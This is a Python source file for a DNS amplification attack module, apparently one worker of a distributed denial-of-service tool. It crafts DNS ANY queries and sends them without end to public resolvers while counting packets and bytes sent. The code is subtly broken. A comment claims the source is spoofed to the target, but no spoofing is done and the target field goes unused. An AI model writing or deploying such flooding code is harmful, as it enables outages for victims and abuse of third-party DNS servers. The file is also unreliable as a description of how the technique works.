import socket
import random
import struct
import time

class DNSAmplification:
    def __init__(self, args, config, stats, running, worker_id):
        self.target = args.target
        self.port = args.port
        self.config = config.get('dns', {})
        self.stats = stats
        self.running = running
        self.worker_id = worker_id
        self.dns_servers = self.config.get('dns_servers', ['8.8.8.8', '1.1.1.1'])
        
    def _build_dns_query(self, domain):
        # Transaction ID
        tid = random.randint(0, 65535)
        
        # Flags: RD=1
        flags = 0x0100
        
        # Questions: 1
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('!HHHHHH', tid, flags, questions, answer_rrs, authority_rrs, additional_rrs)
        
        # Encode domain name
        qname = b''
        for part in domain.split('.'):
            qname += struct.pack('B', len(part)) + part.encode()
        qname += b'\x00'
        
        # Query type ANY (255)
        qtype = struct.pack('!H', 255)
        qclass = struct.pack('!H', 1)  # IN
        
        return header + qname + qtype + qclass
    
    def attack(self):
        domain = self.config.get('amplification_domain', 'example.com')
        query = self._build_dns_query(domain)
        
        while self.running.value:
            try:
                dns_server = random.choice(self.dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                # Spoof source to target
                sock.sendto(query, (dns_server, 53))
                
                with self.stats['sent'].get_lock():
                    self.stats['sent'].value += 1
                    self.stats['bps'].value += len(query)
                    
                sock.close()
                
            except Exception:
                with self.stats['failed'].get_lock():
                    self.stats['failed'].value += 1
                time.sleep(0.01)
